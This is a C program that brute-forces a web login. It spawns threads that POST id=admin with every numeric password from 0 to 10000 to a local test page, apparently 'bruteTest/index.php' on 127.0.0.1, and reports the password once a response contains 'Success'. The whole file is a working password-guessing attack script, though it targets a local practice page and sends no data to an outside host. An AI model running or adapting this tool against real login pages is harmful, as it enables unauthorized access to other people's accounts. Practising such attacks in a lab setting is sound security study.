#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <pthread.h>
#include <fcntl.h>
#include <errno.h>

#define IP		"127.0.0.1"
#define PORT	80

#define MAX_HTTP_SIZE	3000
#define MIN_PASSWORD	0
#define MAX_PASSWORD	10000

pthread_mutex_t mutex;
char http_cmn[MAX_HTTP_SIZE];

void * handle_brute(void * arg);
void setnonblockingmode(int fd);

int main(int argc, char * argv[])
{
	pthread_t t_id;
	int sock;
	struct sockaddr_in serv_addr;
	int pw;
	int * arg;
	
	setnonblockingmode(1);
	setnonblockingmode(2);

	memset(&serv_addr, 0, sizeof(serv_addr));
	serv_addr.sin_family = AF_INET;
	serv_addr.sin_addr.s_addr = inet_addr(IP);
	serv_addr.sin_port = htons(PORT);
	
	strcpy(http_cmn,"POST /bruteTest/index.php HTTP/1.1 \r\n");
	strcat(http_cmn,"Host: 127.0.0.1\r\n");
	strcat(http_cmn,"Content-Type: application/x-www-form-urlencoded \r\n");
	strcat(http_cmn,"Content-Length: 100 \r\n");
	strcat(http_cmn,"\r\n");
	strcat(http_cmn,"id=admin&pw=");

	pthread_mutex_init(&mutex, NULL);

	for(pw=MIN_PASSWORD; pw<=MAX_PASSWORD; pw++)
	{
		printf("[*] Trying %d...\n",pw);
		
		while((sock=socket(PF_INET, SOCK_STREAM, 0)) == -1) {
			fprintf(stderr, "socket() error!!\n");
		}

		while(connect(sock, (struct sockaddr*) &serv_addr, sizeof(serv_addr)) == -1) {
			fprintf(stderr, "connect() error!!\n");
		}
		
		arg = (int*) malloc(sizeof(int) * 2);
		arg[0] = sock;
		arg[1] = pw;
		pthread_create(&t_id, NULL, handle_brute, (void*)arg);
		pthread_detach(t_id);	
	}

	// For "process is terminated after all thread are terminated"
	pthread_exit(NULL);
	//pthread_mutex_destroy(&mutex);

	return 0;
}

void * handle_brute(void * arg)
{
	char http_send[MAX_HTTP_SIZE];
	char http_recv[MAX_HTTP_SIZE];
	int sock = ((int*)arg)[0];
	int pw = ((int*)arg)[1];
	int recv_sz;
	
	//pthread_mutex_lock(&mutex);
	sprintf(http_send, "%s%d", http_cmn, pw);
	//pthread_mutex_unlock(&mutex);
	
	send(sock, http_send, strlen(http_send), 0);
	shutdown(sock, SHUT_WR);

	while((recv_sz=recv(sock, http_recv, MAX_HTTP_SIZE-1, 0)) != 0)
	{
		http_recv[recv_sz] = '\0';
		if(strstr(http_recv,"Success")) {
			printf("[*] Found!\n[*] Password is %d\n", pw);
			close(sock);
			exit(1);
		}
	}
	
	printf("[*] Trying %d... finished!\n", pw);
	close(sock);
	free(arg);

	return NULL;
}

void setnonblockingmode(int fd)
{
	int flag = fcntl(fd, F_GETFL, 0);
	fcntl(fd, F_SETFL, flag | O_NONBLOCK);
}

